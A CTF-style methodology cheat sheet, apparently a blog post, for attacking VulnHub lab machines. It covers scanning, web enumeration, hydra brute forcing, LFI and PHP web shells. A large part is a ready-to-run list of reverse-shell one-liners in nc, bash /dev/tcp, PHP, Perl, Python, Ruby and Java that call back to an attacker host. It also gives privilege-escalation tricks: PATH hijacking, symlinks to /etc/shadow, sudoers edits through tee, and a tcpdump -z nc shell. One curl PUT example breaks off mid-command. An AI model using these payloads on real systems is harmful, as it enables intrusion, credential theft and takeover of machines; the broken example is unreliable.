********************************
CTF Series : Vulnerable Machines
********************************

This post (Work in Progress) mark downs the learning gathered by doing the vulnerable machines provided by the VulnHub and others. Once you download the virtual machine from the website and run it in VMware or Virtual Box, below steps could be followed to find the vulnerabilities.

We would like to **thank g0tm1lk** for maintaining Vulhub and **shout-out** to each and every **author of the Vulnerable Machine / write-ups** submitted. Thank you for providing awesome challenges to learn from and sharing your knowledge to the community!. **Thank You!!**

Finding the IP address
======================

Netdiscover
-----------

An active/passive arp reconnaissance tool

::

  netdiscover [options] 
  -i interface : The network interface to sniff and inject packets. 
  -r range : Scan a given range instead of auto scan.

  Example: 
  netdiscover -i eth0/wlan0/vboxnet0/vmnet1 -r 192.168.1.0/24 
	
Interface name for Virtualization Software

* Virtualbox : vboxnet 
* Vmware     : vmnet 

Nmap
----

Network exploration tool and security / port scanner 

::

  nmap [Scan Type] [Options] {target specification} 
  -sP/-sn Ping Scan -disable port scan 

  Example: nmap -sP/-sn 192.168.1.0/24

Port Scanning
=============
	
Port scanning provides a large amount of information on open services and possible exploits that target these services. Two options

Unicornscan
-----------

A port scanner that utilizes it’s own userland TCP/IP stack, which allows it to run a asynchronous scans. Faster than nmap and can scan 65,535 ports in a relatively shorter time frame. 

::  

   unicornscan [options] X.X.X.X/YY:S-E 
     -i, --interface : interface name, like eth0 or fxp1, not normally required 
     -m, --mode : scan mode, tcp (syn) scan is default, U for udp T for tcp \`sf' for tcp connect scan and A for arp for -mT you can also specify tcp flags following the T like -mTsFpU for example that would send tcp syn packets with (NO Syn\|FIN\|NO Push\|URG)
     Address ranges are cidr like 1.2.3.4/8 for all of 1.?.?.?, if you omit the cidr mask then /32 is implied. 
     Port ranges are like 1-4096 with 53 only scanning one port, a for all 65k and p for 1-1024

    example: unicornscan 192.168.1.5:1-4000 gateway:a would scan port 1 - 4000 for 192.168.1.5 and all 65K ports for gateway.

Nmap
-----

Network exploration tool and security / port scanner 

::

  nmap [Scan Type] [Options] {target specification} 

  HOST DISCOVERY:
  -sL: List Scan - simply list targets to scan 
  -sn: Ping Scan - disable port scan 
  -Pn: Treat all hosts as online -- skip host discovery

  SCAN TECHNIQUES: 
  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans 
  -sU: UDP Scan -sN/sF/sX: TCP Null, FIN, and Xmas scans

  PORT SPECIFICATION: 
  -p : Only scan specified ports 
  Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9

  SERVICE/VERSION DETECTION: 
  -sV: Probe open ports to determine service/version info

  OUTPUT: 
  -oN/-oX/-oS/-oG : Output scan in normal, XML,Output in the three major formats at once 
  -v: Increase verbosity level (use -vv or more for greater effect)

  MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, script scanning, and traceroute


As unicornscan is so fast, it makes sense to use it for scanning large networks or a large number of ports. The idea is to use unicornscan to scan all ports, and make a list of those ports that are open and pass them to nmap for service detection. superkojiman has written a script for this available at `GitHub <https://github.com/superkojiman/onetwopunch>`_.

When portscanning a host, you will be presented with a list of open ports. In many cases, the port number tells you what application is running. Port 25 is usually SMTP, port 80 mostly HTTP. However, this is not always the case, and especially when dealing with proprietary protocols running on non-standard ports you will not be able to determine what application is running.

Amap - Application mapper
-------------------------

By using **amap**, we can identify if any SSL server is running on port 3445 or some oracle listener on port 23. Also, it will actually do an SSL connect if you want and then try to identify the SSL-enabled protocol! One of the VM in vulnhub was running http and https on the same port.

::

  amap -A 192.168.1.2 12380 amap v5.4 (www.thc.org/thc-amap) started at 2016-08-10 05:48:09 - APPLICATION MAPPING mode
  Protocol on 192.168.1.2:12380/tcp matches http 
  Protocol on 192.168.1.2:12380/tcp matches http-apache-2 
  Protocol on 192.168.1.2:12380/tcp matches ntp 
  Protocol on 192.168.1.2:12380/tcp matches ssl
  Unidentified ports: none.
  amap v5.4 finished at 2016-08-10 05:48:16


Listen to the interface
=======================

We should always listen to the local interface on which the VM is hosted such as vboxnet0 or vmnet using wireshark or tcpdump. Many VMs send data randomly, for example, In one of the VM, it does the arp scan and sends a SYN packet on the port 4444, if something is listening on that port, it send the data.

:: 

  18:02:04.096292 IP 192.168.56.101.36327 > 192.168.56.1.4444: Flags [S], seq 861815232, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 4127458640 ecr 0], length 0
  18:02:04.096330 IP 192.168.56.1.4444 > 192.168.56.101.36327: Flags [R.], seq 0, ack 861815233, win 0, length 0
  18:02:04.098567 ARP, Request who-has 192.168.56.2 tell 192.168.56.101, length 28
  18:02:04.098584 ARP, Request who-has 192.168.56.2 tell 192.168.56.101, length 28
  18:02:04.100756 ARP, Request who-has 192.168.56.3 tell 192.168.56.101, length 28
  18:02:04.100773 ARP, Request who-has 192.168.56.3 tell 192.168.56.101, length 28
  18:02:04.096292 IP 192.168.56.101.36327 > 192.168.56.1.4444: Flags [S],

On listening on the port 4444, we might receive a something like a base64 encoded string or some message.

::

  nc -lvp 4444
  listening on [any] 4444 …
  192.168.56.101: inverse host lookup failed: Unknown host
  connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 39519
  0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxh


From Nothing to a Unprivileged Shell
====================================

At this point, you would have an idea about the different services and service version running on the system. ( aka figure out what webservices such as cms or software's are running on the vulnerable machine )

searchsploit
------------
Exploit Database Archive Search

First, we need to check if the operating system is using any services which are vulnerable or the exploit is already available in the internet. For example, A vulnerable service webmin is present in one of the VM which can be exploited to extract information from the system.

::

  root@kali:~# nmap -sV -A 172.16.73.128
  **********Trimmed**************
  10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
  |_http-methods: No Allow or Public header in OPTIONS response (status code 200)
  |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
  | ndmp-version: 
  |_  ERROR: Failed to get host information from server
  **********Trimmed**************

If we search for webmin in searchsploit, we will find different exploits available for it and we just have to use the correct one based on the utility and the version matching.

::

  root@kali:~# searchsploit webmin
  **********Trimmed**************
  Description                                                                            Path
  ----------------------------------------------------------------------------------------------------------------
  Webmin < 1.290 / Usermin < 1.220 Arbitrary File Disclosure Exploit                   | /multiple/remote/1997.php
  Webmin < 1.290 / Usermin < 1.220 Arbitrary File Disclosure Exploit (perl)            | /multiple/remote/2017.pl
  Webmin 1.x HTML Email Command Execution Vulnerability                                | /cgi/webapps/24574.txt
  **********Trimmed**************

Searchsploit even provide an option to read the nmap XML file and suggest vulnerabilities ( Need nmap -sV -x xmlfile ).

::
  
  searchsploit

       --nmap     [file.xml]  Checks all results in Nmap's XML output with service version (e.g.: nmap -sV -oX file.xml).
                              Use "-v" (verbose) to try even more combinations


SecLists.Org Security Mailing List Archive
------------------------------------------

There would be some days, when you won't find vulnerability in searchsploit. We should also check the `seclists.org security mailing list google search <http://seclists.org/>`_ , if someone has reported any bug for that particular software. 

Webservices
-----------

If a webserver is running on the machine, we can start with running 
 
whatweb
^^^^^^^

Utilize whatweb to find what server is running. Further, we can execute nikto, w3af to find any vulnerabilities. dirb to find any hidden directories.

PUT Method
^^^^^^^^^^

Sometimes, it is also a good option to check for the various OPTIONS available on the website such as GET, PUT, DELETE etc.

Curl command can be used to check the options available:

::

  curl -X OPTIONS -v http://192.168.126.129/test/
  Trying 192.168.126.129…
  Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
  > OPTIONS /test/ HTTP/1.1
  > Host: 192.168.126.129
  > User-Agent: curl/7.47.0
  > Accept: /
  >
  < HTTP/1.1 200 OK
  < DAV: 1,2
  < MS-Author-Via: DAV
  < Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
  < Allow: OPTIONS, GET, HEAD, POST
  < Content-Length: 0
  < Date: Fri, 29 Apr 2016 09:41:19 GMT
  < Server: lighttpd/1.4.28
  <
  * Connection #0 to host 192.168.126.129 left intact

The put method allows you to upload a file. Eventually, you can upload a php file which can work as a shell. There are multiple methods to upload the file as mentioned in `Detecting and exploiting the HTTP Put Method <http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html>`_ 

The few are

* Nmap:

 ::

   nmap -p 80 --script http-put --script-args http-put.url='/uploads/rootme.php',http-put.file='/tmp/rootme.php'

* curl:

 ::

   curl --upload-file test.txt -v --url http://192.168.126.129/test/test.txt

 or

 :: 

   curl -X PUT -d '

Wordpress
^^^^^^^^^

When running wpscan, also make sure you run --enumerate u for enumerating usernames. By default wpscan doesn't run it. Also, scan for plugins

::

  wpsscan
    --url       | -u <target url>       The WordPress URL/domain to scan.
    --force     | -f                    Forces WPScan to not check if the remote site is running WordPress.
    --enumerate | -e [option(s)]        Enumeration.
    option :
    	u        usernames from id 1 to 10
    	u[10-20] usernames from id 10 to 20 (you must write [] chars)
    	p        plugins
    	vp       only vulnerable plugins
    	ap       all plugins (can take a long time)
    	tt       timthumbs
    	t        themes
    	vt       only vulnerable themes
    	at       all themes (can take a long time)
    	Multiple values are allowed : "-e tt,p" will enumerate timthumbs and plugins
    	If no option is supplied, the default is "vt,tt,u,vp"

Wordpress configuration is stored in wp-config.php. If you are able to download it, you might get username and password to database. We can also use wordpress to bruteforce password for a username 

::

  wpscan --url http://192.168.1.2 --wordlist /home/bitvijays/Documents/Walkthru/Mr_Robot_1/test.txt --username elliot

Names? Possible Usernames? Possible Passwords?
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   
Sometimes, on visiting the webpage of the webserver (If Vulnerable machine is running any http/https webserver), you would found possible  names of the employees working in the company. Now, it is common practise to have username based on your first/last name. Superkojiman has written a script `namemash.py <https://gist.githubusercontent.com/superkojiman/11076951/raw/8b0d545a30fd76cb7808554b1c6e0e26bc524d51/namemash.py>`_ which could be used to create possible usernames. However, we still have a large amount of  usernames to bruteforce with passwords. Further, if the vulnerable machine is running a SMTP mail server, we can verify if the particular username exists or not and modify namemash.py to generate usernames for that pattern.

* Using metasploit smtp\_enum module: Once msfconsole is running, use auxiliary/scanner/smtp/smtp\_enum, enter the RHOSTS (target address) and USER FILE containing the list of probable user accounts.
* Using VRFY command:
* Using RCPT TO command:

Brute forcing: hydra
^^^^^^^^^^^^^^^^^^^^

::

  -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE
  -p PASS  or -P FILE try password PASS, or load several passwords from FILE
  -U        service module usage details
  -e nsr additional checks, "n" for null password, "s" try login as pass, "r" try the reverse login as pass

hydra http-post-form:

:: 

   hydra -U http-post-form

    Help for module http-post-form:
    ============================================================================
    Module http-post-form requires the page and the parameters for the web form.

    By default this module is configured to follow a maximum of 5 redirections in a row. It always gathers a new cookie from the same URL without variables. The parameters take three ":" separated values, plus optional values.

    (Note: if you need a colon in the option string as value, escape it with "\:", but do not escape a "\" with "\\".)

    Syntax:   <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
    First is the page on the server to GET or POST to (URL).
    Second is the POST/GET variables (taken from either the browser, proxy, etc.
    with usernames and passwords being replaced in the "^USER^" and "^PASS^" placeholders (FORM PARAMETERS)
    Third is the string that it checks for an *invalid* login (by default)
    Invalid condition login check can be preceded by "F=", successful condition
    login check must be preceded by "S=".
    This is where most people get it wrong. You have to check the webapp what a failed string looks like and put it in this parameter!
    			The following parameters are optional:
     			C=/page/uri     to define a different page to gather initial cookies from
     			(h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
                     		^USER^ and ^PASS^ can also be put into these headers!
                     		Note: 'h' will add the user-defined header at the end
                     		regardless it's already being sent by Hydra or not.
                     		'H' will replace the value of that header if it exists, by the
                    		 one supplied by the user, or add the header at the end
    			Note that if you are going to put colons (:) in your headers you should escape them with a backslash (\).
     			All colons that are not option separators should be escaped (see the examples above and below).
     			You can specify a header without escaping the colons, but that way you will not be able to put colons
     			in the header value itself, as they will be interpreted by hydra as option separators.

    			Examples:
     			"/login.php:user=^USER^&pass=^PASS^:incorrect"
     			"/login.php:user=^USER^&pass=^PASS^&colon=colon\:escape:S=authlog=.*success"
     			"/login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed"
     			"/:user=^USER&pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^"
     			"/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:reason=:C=/exchweb"

LFI : Reading a php file
^^^^^^^^^^^^^^^^^^^^^^^^

If a website is affected by a LFI, we could use php filter to read the source code of a PHP File

:: 

  http://xqi.cc/index.php?m=php://filter/read=convert.base64-encode/resource=index.php

More information can be found at `Using PHP for file inclusion <https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/>`_

To test LFI, RFI, we can also use `Uniscan <http://tools.kali.org/web-applications/uniscan>`_ Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner. 

::

  uniscan -h
  OPTIONS:
    -h  help
    -u  <url> example: https://www.example.com/
    -f  <file> list of url's
    -b  Uniscan go to background
    -q  Enable Directory checks
    -w  Enable File checks
    -e  Enable robots.txt and sitemap.xml check
    -d  Enable Dynamic checks
    -s  Enable Static checks
    -r  Enable Stress checks
    -i  <dork> Bing search
    -o  <dork> Google search
    -g  Web fingerprint
    -j  Server fingerprint

  usage:
  [1] perl ./uniscan.pl -u http://www.example.com/ -qweds
  [2] perl ./uniscan.pl -f sites.txt -bqweds
  [3] perl ./uniscan.pl -i uniscan
  [4] perl ./uniscan.pl -i "ip:xxx.xxx.xxx.xxx"
  [5] perl ./uniscan.pl -o "inurl:test"
  [6] perl ./uniscan.pl -u https://www.example.com/ -r

There's another tool called `fimap <https://tools.kali.org/web-applications/fimap>`_. However, it's way better to checkout the source of uniscan for LFI and see what it is trying and try that with curl specially if cookies are required to set ( in case of authenticated LFI ). Personally, I tried Uniscan and for some reason cookie feature was not working and fimap only support POST parameter in cookie no GET.

Also, if we have unprivileged user shell, however don't have permission to write in /var/www/html but does have LFI, we can still write (php meterpreter shell) in /tmp or user home directory and utilize LFI to get a reverse shell.


Reverse Shells
--------------

Mostly taken from `PentestMonkey Reverse shell cheat sheet <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>`_  and `Reverse Shell Cheat sheet from HighOn.Coffee <https://highon.coffee/blog/reverse-shell-cheat-sheet/>`_ and some more.

netcat (nc)
^^^^^^^^^^^

* with the -e option

::

  nc -e /bin/sh 10.0.0.1 1234

* without -e option

::

  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

PHP
^^^

* **PHP Shell**

 We can create a new file say ( shell.php ) on the server containing

 :: 

   <?php system($\_GET["cmd"]); ?>

 or

 :: 

   <?php echo shell_exec($\_GET["cmd"]); ?>

 which can be accessed by

 :: 

  http://IP/shell.php?cmd=id

 or 

* **PHP Meterpreter**

 We can create a php meterpreter shell, run a exploit handler on msf, upload the payload on the server and wait for the connection.

 ::

  msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o /tmp/payload.php

* **PHP Reverse Shell**

 PHP Trick: This code assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6

 :: 

  php -r '$sock=fsockopen("192.168.56.101",1337);exec("/bin/sh -i <&3 >&3 2>&3");'

 The above can be connected by listening at port 1337 by using nc

Weevely
^^^^^^^

Weevely also generates a webshell

:: 

  weevely generate password /tmp/payload.php

which can be called by

:: 

  weevely http://192.168.1.2/location_of_payload password

However, it wasn't as useful as php meterpreter or reverse shell.


Ruby
^^^^

:: 

  ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

Perl
^^^^

.. code-block :: bash 

  perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

Python
^^^^^^

.. code-block :: bash  

  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Java
^^^^

.. code-block :: bash 

  r = Runtime.getRuntime()
  p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
  p.waitFor()

JSP
^^^

.. code-block :: bash 

   msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.129 LPORT=4444 -f war > runme.war

Bash /dev/tcp
^^^^^^^^^^^^^

If a server is listening on a port:

::

  nc -lvp port

then we can use the below to connect

::
   
  /bin/bash -i >&/dev/tcp/IP/Port 0>&1


XTerm
^^^^^

One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.

.. code-block :: bash 

  xterm -display 10.0.0.1:1


To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):

::
 
   Xnest :1

You’ll need to authorise the target to connect to you (command also run on your host):

::

  xhost +targetip

Lynx
^^^^

Obtain an interactive shell through lynx: It is possible to obtain an interactive shell via special LYNXDOWNLOAD URLs. This is a big security hole for sites that use lynx "guest accounts" and other public services. More details `LynxShell <http://insecure.org/sploits/lynx.download.html>`_ 

When you start up a lynx client session, you can hit "g" (for Goto) and then enter the following URL:

:: 

  URL to open: LYNXDOWNLOAD://Method=-1/File=/dev/null;/bin/sh;/SugFile=/dev/null

MYSQL
^^^^^

* If we have MYSQL Shell via sqlmap or phpmyadmin, we can use mysql outfile/ dumpfile function to upload a shell.

 :: 

   echo -n "<?php phpinfo(); ?>" | xxd -ps 3c3f70687020706870696e666f28293b203f3e
   select 0x3c3f70687020706870696e666f28293b203f3e into outfile "/var/www/html/blogblog/wp-content/uploads/phpinfo.php"

 or 

 ::
 
  SELECT "<?php passthru($_GET['cmd']); ?>" into dumpfile '/var/www/html/shell.php';

* If you have sql-shell from sqlmap/ phpmyadmin, we can use

 :: 
	
   select load_file('/etc/passwd');

Spawning a TTY Shell
--------------------

Spawning a TTY Shell and Post-Exploitation Without A TTY has provided multiple ways to get a tty shell

Python
^^^^^^

.. code-block :: bash 

  python -c 'import pty; pty.spawn("/bin/sh")'

or

.. code-block :: bash

  python -c 'import pty; pty.spawn("/bin/bash")'

.. code-block :: bash

  python -c 'import os; os.system("/bin/bash")'

sh
^^

.. code-block :: bash

  /bin/sh -i

Perl
^^^^

.. code-block :: bash 

  perl -e 'exec "/bin/sh";'

.. code-block :: bash

  perl: exec "/bin/sh";

Ruby
^^^^

.. code-block :: bash

   ruby: exec "/bin/sh"

Lua
^^^

.. code-block :: bash

   lua: os.execute('/bin/sh')

IRB
^^^
(From within IRB)

.. code-block :: bash

  exec "/bin/sh"

VI
^^

(From within vi)

.. code-block :: bash 

  :!bash

(From within vi)

.. code-block :: bash 

  :set shell=/bin/bash:shell

Also, if we execute

::

  vi ;/bin/bash

Once, we exit vi, we would get shell. Helpful in scenarios where the user is asked to input which file to open.

Nmap
^^^^

(From within nmap)

.. code-block :: bash 

  !sh

Expect
^^^^^^

Using “Expect” To Get A TTY

.. code-block :: bash 

  $ cat sh.exp
  #!/usr/bin/expect
  # Spawn a shell, then allow the user to interact with it.
  # The new shell will have a good enough TTY to run tools like ssh, su and login
  spawn sh
  interact

Sneaky Stealthy SU in (Web) Shells
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Let's say we have a webshell on the server ( probably, we would be logged in as a apache user), however, if we have credentials of another user, and we want to login we need a tty shell. We can use a shell terminal trick that relies on Python to turn our non-terminal shell into a terminal shell. 

**Example**

Webshell like

::

 http://IP/shell.php?cmd=id

If we try 

::

 echo password | su -c whoami

Probably will get

::

 standard in must be a tty

The su command would work from a terminal, however, would not take in raw stuff via the shell's Standard Input.

We can use a shell terminal trick that relies on Python to turn our non-terminal shell into a terminal shell

::

 (sleep 1; echo password) | python -c "import pty; pty.spawn(['/bin/su','-c','whoami']);"
 root

The above has been referenced from SANS `Sneaky Stealthy SU in (Web) Shells <https://pen-testing.sans.org/blog/2014/07/08/sneaky-stealthy-su-in-web-shells#>`_

Gather information from files
-----------------------------

In case of LFI or unprivileged shell, gathering information could be very useful. Mostly taken from `g0tmi1k Linux Privilege Escalation Blog <https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>`_

Operating System
^^^^^^^^^^^^^^^^
::

  cat /etc/issue
  cat /etc/*-release
    cat /etc/lsb-release      # Debian based
    cat /etc/redhat-release   # Redhat based

/Proc Variables
^^^^^^^^^^^^^^^
::

  /proc/version     -- Kernel Versions

Environment Variables
^^^^^^^^^^^^^^^^^^^^^

::

 cat /etc/profile
 cat /etc/bashrc
 cat ~/.bash_profile
 cat ~/.bashrc
 cat ~/.bash_logout

Configuration Files
^^^^^^^^^^^^^^^^^^^

* Apache Web Server : Helps in figuring out the DocumentRoot where does your webserver files are?

 ::

   /etc/apache2/apache2.conf
   /etc/apache2/sites-enabled/000-default 

User History
^^^^^^^^^^^^

::

  ~/.bash_history
  ~/.nano_history
  ~/.atftp_history
  ~/.mysql_history
  ~/.php_history
  ~/.viminfo

Private SSH Keys / SSH Configuration
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

::

  ~/.ssh/authorized_keys : specifies the SSH keys that can be used for logging into the user account 
  ~/.ssh/identity.pub
  ~/.ssh/identity
  ~/.ssh/id_rsa.pub
  ~/.ssh/id_rsa
  ~/.ssh/id_dsa.pub
  ~/.ssh/id_dsa
  /etc/ssh/ssh_config  : OpenSSH SSH client configuration files
  /etc/ssh/sshd_config : OpenSSH SSH daemon configuration file

Unprivileged shell to privileged shell
======================================

Probably, at this point of time, we would have unprivileged shell of user www-data. It would be a good idea to first check privilege escalation techniques from g0tm1lk blog such as if there are any binary executable with SUID bits, if there are any cron jobs running with root permissions. 

If you have become a normal user of which you have a password, it would be a good idea to check sudo -l to check if there are any executables you have permission to run.


Privilege esclation from g0tm1lk blog
-------------------------------------

What "Advanced Linux File Permissions" are used?
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Sticky bits, SUID & GUID

::

   find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
   find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
   find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.

   find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
   for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

   # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
    find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
 
Where can written to and executed from?
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

A few 'common' places: /tmp, /var/tmp, /dev/shm

::

  find / -writable -type d 2>/dev/null      # world-writeable folders
  find / -perm -222 -type d 2>/dev/null     # world-writeable folders
  find / -perm -o w -type d 2>/dev/null     # world-writeable folders

  find / -perm -o x -type d 2>/dev/null     # world-executable folders

  find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders

Any "problem" files?
^^^^^^^^^^^^^^^^^^^^

Word-writeable, "nobody" files

::

  find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
  find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files

Find files/ folder owned by the user
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

After compromising the machine with an unprivileged shell, /home would contains the users present on the system. Also, viewable by checking /etc/passwd. Many times, we do want to see if there are any files owned by those users outside their home directory.

::

  find / -user username 2> /dev/null
  find / -group groupname 2> /dev/null


.. Tip :: Find files by wheel/ adm users.

Execution of binary from Relative location than Absolute
--------------------------------------------------------
If we figure out that a suid binary is running with relative locations ( for example let's say backjob is running "id" and "scp /tmp/special ron@ton.home" )( figured out by running strings on the binary ). The problem with this is, that it’s trying to execute a file/script/program on a RELATIVE location (opposed to an ABSOLUTE location like /sbin would be). And we will now exploit this to become root.

so we can create a file in temp:

::

  echo "bash -i" >> /tmp/id 

  or 

  cp /bin/sh /tmp/id

:: 

  www-data@yummy:/tmp$ cp /bin/sh id
  www-data@yummy:/tmp$ export PATH=/tmp:$PATH
  www-data@yummy:/tmp$ which id
  /tmp/id
  www-data@yummy:/tmp$ /opt/backjob
  whoami
  root
  # /usr/bin/id
  uid=0(root) gid=0(root) groups=0(root),33(www-data)

By changing the PATH prior executing the vulnerable suid binary (i.e. the location, where Linux is searching for the relative located file), we force the system to look first into /tmp when searching for “scp” or "id" . So the chain of commands is: /opt/backjob switches user context to root (as it is suid) and tries to run “scp …” -> Linux searches the filesystem according to its path (here: in /tmp first) -> Our malicious /tmp/scp gets found and executed as root -> A new bash opens with root privileges.

If we execute a binary without specifying an absolute paths, it goes in order of your $PATH variable. By default, it's something like:

::

  /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

It is important to see .bash_profile file which contains the $PATH

Symlink Creation
----------------

Multiple time, we would find that a suid binary belonging to another user is authorized to read a particular file. For example Let's say there's a suid binary called readExampleConf which can read a file named example.conf as a suid user. This binary can be tricked into reading any other file by creating a Symlink or a softlink. For example if we want to read /etc/shadow file which can be read by suid user. we can do

::

 ln -s /etc/shadow /home/xxxxxx/example.conf
 ln -s /home/xxx2/.ssh/id_rsa /home/xxxxxxx/example.conf

Now, when we try to read example.conf file, we would be able to read the file for which we created the symlink

::

 readExampleConf /home/xxxxxxx/example.conf
 <Contents of shadow or id_rsa



MySQL Privilged Escalation
--------------------------

If mysql ( version 4.x, 5.x ) process is running as root and we do have the mysql root password and we are an unprivileged user, we can utilize `User-Defined Function (UDF) Dynamic Library Exploit <http://www.0xdeadbeef.info/exploits/raptor_udf.c>`_ . A blog named `Gaining a root shell using mysql user defined functions and setuid binaries <https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/>`_  

More Information
^^^^^^^^^^^^^^^^

* The MySQL service should really not run as root. The service and all mysql directories should be run and accessible from another account - mysql as an example.

* When MySQL is initialised, it creates a master account (root by default) that has all privileges to all databases on MySQL. This root account differs from the system root account, although it might still have the same password due to default install steps offered by MySQL.

* Commands can be executed inside MySQL, however, commands are executed as the current logged in user.

::

  mysql> \! sh

Cron.d
------

Check cron.d and see if any script is executed as root at any time and is world writeable. If so, you can use to setuid a binary with /bin/bash and use it to get root.

Suid.c

::

  int main(void) {
  setgid(0); setuid(0);
  execl(“/bin/sh”,”sh”,0); }

or

::

 int main(void) {
 setgid(0); setuid(0);
 system("/bin/bash"); }



SUDO -l Permissions
-------------------

Let's see which executables have permission to run as sudo, We have collated the different methods to get a shell if the below applications are suid: nmap, tee, tcpdump, 

nmap suid
^^^^^^^^^

:: 

  nmap --script <(echo 'require "os".execute "/bin/sh"')

or

:: 

  nmap --interactive

tee suid
^^^^^^^^

If tee is suid: tee is used to read input and then write it to output and files. That means we can use tee to read our own commands and add them to any_script.sh, which can then be run as root by a user. If some script is run as root, you may also run. For example, let's say tidy.sh is executed as root on the server, we can write the below code in temp.sh

:: 

  temp.sh
  echo “milton ALL=(ALL) ALL” > /etc/sudoers” 

or 

::

  chmod +w /etc/sudoers to add write properties to sudoers file to do the above

and then

:: 

  cat temp.sh | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh

which will add contents of temp.sh to tidyup.sh. ( Assuming tidyup.sh is running as root by crontab )

tcpdump
^^^^^^^

The “-z postrotate-command” option (introduced in tcpdump version 4.0.0).

Create a temp.sh ( which contains the commands to executed as root )

:: 

  id
  /bin/nc 192.168.110.1 4444 -e /bin/bash

Execute the command

:: 

  sudo tcpdump -i eth0 -w /dev/null -W 1 -G 1 -z ./temp.sh -Z root

where
 
:: 

  -C file_size : Before  writing a raw packet to a savefile, check whether the file is currently larger than file_size and, if so, close the current savefile and open a new one.  Savefiles after the first savefile will have the name specified with the -w flag, with a number after it, starting at 1 and continuing upward.  The units of file_size are millions of bytes (1,000,000 bytes, not 1,048,576 bytes).

  -W Used  in conjunction with the -C option, this will limit the number of files created to the specified number, and begin overwriting files from the beginning, thus creating a 'rotating' buffer.  In addition,it will name the files with enough leading 0s to support the maximum number of files, allowing them to sort correctly. Used in conjunction with the -G option, this will limit the number of rotated dump files that get created, exiting with status 0 when reaching the limit. If used with -C as well, the behavior will result in cyclical files per timeslice.

  -z postrotate-command Used in conjunction with the -C or -G options, this will make tcpdump run " postrotate-command file " where file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip will compress each savefile using gzip or bzip2.

  Note that tcpdump will run the command in parallel to the capture, using the lowest priority so that this doesn't disturb the capture process.

